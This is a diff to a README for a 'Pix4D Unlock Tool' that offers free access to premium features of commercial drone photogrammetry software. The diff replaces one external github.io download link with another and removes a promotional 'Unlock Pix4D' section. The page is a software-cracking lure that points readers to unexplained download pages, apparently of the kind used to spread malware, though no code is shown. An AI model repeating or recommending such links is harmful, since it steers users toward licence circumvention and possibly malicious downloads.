@@ -5,12 +5,7 @@
 
 <h1 align="center">⚡ Pix4D Unlock Tool</h1>
 
-<p align="center">
-  <a href="https://pix4d-free-download.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/Download%20Pix4D%20Unlock%20Tool-Enable%20All%20Features-006400?style=for-the-badge&logo=googleearth&logoColor=white" 
-         alt="Download Pix4D Unlock Tool" style="width: 540px; height: 37px;">
-  </a>
-</p>
+[![Get Now](https://img.shields.io/badge/Get-Now-blue?style=for-the-badge&logo=windows)](https://tumzahfaujia.github.io/.github/pix4d-tool)
 
 <!-- Tool Preview -->
 <p align="center">
@@ -91,13 +86,6 @@ Licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 ## 📚 Support and Contribution
 
 Report bugs or contribute via Issues or Pull Requests.
-
----
-
-## ⭐ Unlock Pix4D – Professional Drone Photogrammetry
-
-Enable all Pix4D premium features including 3D mapping, point clouds, orthomosaic creation, and agriculture NDVI analysis.  
-[Download the Unlock Tool](https://pix4d-free-download.github.io/.github/) and transform drone imagery into accurate geospatial data.
 
 ---
 
